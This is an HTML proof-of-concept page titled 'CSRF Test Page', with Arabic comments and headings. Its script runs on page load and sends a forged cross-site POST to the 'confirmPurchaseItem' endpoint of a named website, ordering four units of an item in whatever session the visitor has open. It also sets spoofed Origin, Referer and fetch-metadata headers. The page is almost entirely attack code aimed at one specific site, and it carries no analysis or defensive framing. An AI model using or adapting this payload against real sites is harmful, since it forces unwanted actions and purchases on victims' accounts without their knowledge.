<!DOCTYPE html>
<html>
  <head>
    <title>CSRF Test Page</title>
  </head>
  <body>
    <h1>جارٍ إرسال الطلب...</h1>
    <script>
      // البيانات المراد إرسالها
      const data = "itemName=cannon&amount=4";

      // إرسال الطلب POST باستخدام XMLHttpRequest
      const xhr = new XMLHttpRequest();
      xhr.open("POST", "https://www.qorsanalmaarefa.com/users/confirmPurchaseItem", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
      xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
      xhr.setRequestHeader("Sec-Ch-Ua-Platform", "Linux");
      xhr.setRequestHeader("Sec-Ch-Ua", '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"');
      xhr.setRequestHeader("Sec-Ch-Ua-Mobile", "?0");
      xhr.setRequestHeader("Origin", "https://www.qorsanalmaarefa.com");
      xhr.setRequestHeader("Sec-Fetch-Site", "same-origin");
      xhr.setRequestHeader("Sec-Fetch-Mode", "cors");
      xhr.setRequestHeader("Sec-Fetch-Dest", "empty");
      xhr.setRequestHeader("Referer", "https://www.qorsanalmaarefa.com/");
      xhr.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
      xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
      xhr.setRequestHeader("Priority", "u=1, i");

      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          if (xhr.status === 200) {
            alert("تم إرسال الطلب بنجاح!");
          } else {
            alert("فشل إرسال الطلب: " + xhr.status);
          }
        }
      };

      xhr.send(data);
    </script>
  </body>
</html>
